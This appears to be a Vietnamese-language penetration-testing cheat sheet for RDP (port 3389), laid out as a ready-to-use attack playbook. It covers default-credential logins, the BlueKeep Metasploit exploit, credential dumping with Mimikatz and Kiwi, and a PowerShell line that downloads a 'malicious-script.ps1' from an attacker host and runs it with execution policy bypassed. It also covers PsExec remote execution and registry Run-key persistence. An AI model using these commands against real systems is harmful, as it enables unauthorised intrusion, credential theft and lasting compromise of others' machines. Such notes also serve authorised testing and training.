# RDP (Port 3389)

## Connect

### Remote Desktop Connection

Kết nối tới máy chủ RDP bằng tiện ích Remote Desktop Connection trên Windows:

```
mstsc /v:<ip>:<port>
```

### xfreerdp

Sử dụng xfreerdp, một client RDP mã nguồn mở, để kết nối từ nhiều nền tảng:

```
xfreerdp /u:<uname> /p:'<pass>' /v:<ip>
xfreerdp /d:<domain.com> /u:<uname> /p:'<pass>' /v:<ip>
xfreerdp /u:<uname> /p:'<pass>' /v:<ip> +clipboard
```

***

## Attack Vectors

### Đăng nhập với thông tin mặc định

Thử các tài khoản/mật khẩu phổ biến như `administrator`, `admin`, `user`:

```
xfreerdp /u:<uname> /p:'<pass>' /v:<ip>
```

### BlueKeep (CVE-2019-0708)

Khai thác lỗ hổng BlueKeep trên các phiên bản Windows dễ bị tấn công để thực thi mã từ xa:

<pre><code>msf> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
<strong>   > set RHOSTS &#x3C;ip>
</strong>   > set LHOST &#x3C;your_ip>
   > exploit
</code></pre>

***

## Post-Exploitation

### Trích xuất thông tin đăng nhập bằng Mimikatz

Trích xuất thông tin đăng nhập từ bộ nhớ sau khi truy cập RDP:

```
Invoke-Mimikatz -DumpCreds
```

### Trích xuất thông tin đăng nhập bằng Kiwi

Sử dụng tiện ích mở rộng Kiwi trong Meterpreter để trích xuất thông tin đăng nhập:

```
meterpreter > load kiwi
meterpreter > creds_all
```

### Thực thi mã từ xa (RCE)

Thực thi mã tùy ý trên máy chủ RDP bằng PowerShell:

<pre data-overflow="wrap"><code><strong>Invoke-WebRequest -Uri http://&#x3C;your_ip>/malicious-script.ps1 -OutFile C:\temp\malicious-script.ps1
</strong>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File C:\temp\malicious-script.ps1
</code></pre>

### Chạy chương trình từ xa

Chạy chương trình trên máy chủ RDP bằng PsExec:

```
psexec \\<ip> -u <username> -p <password> "cmd.exe /c \"C:\path\to\executable.exe\""
```

### Duy trì truy cập

Thêm mục đăng ký để duy trì truy cập liên tục trên hệ thống:

{% code overflow="wrap" %}

```
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v <key_name> /t REG_SZ /d "<command>" /f
```

{% endcode %}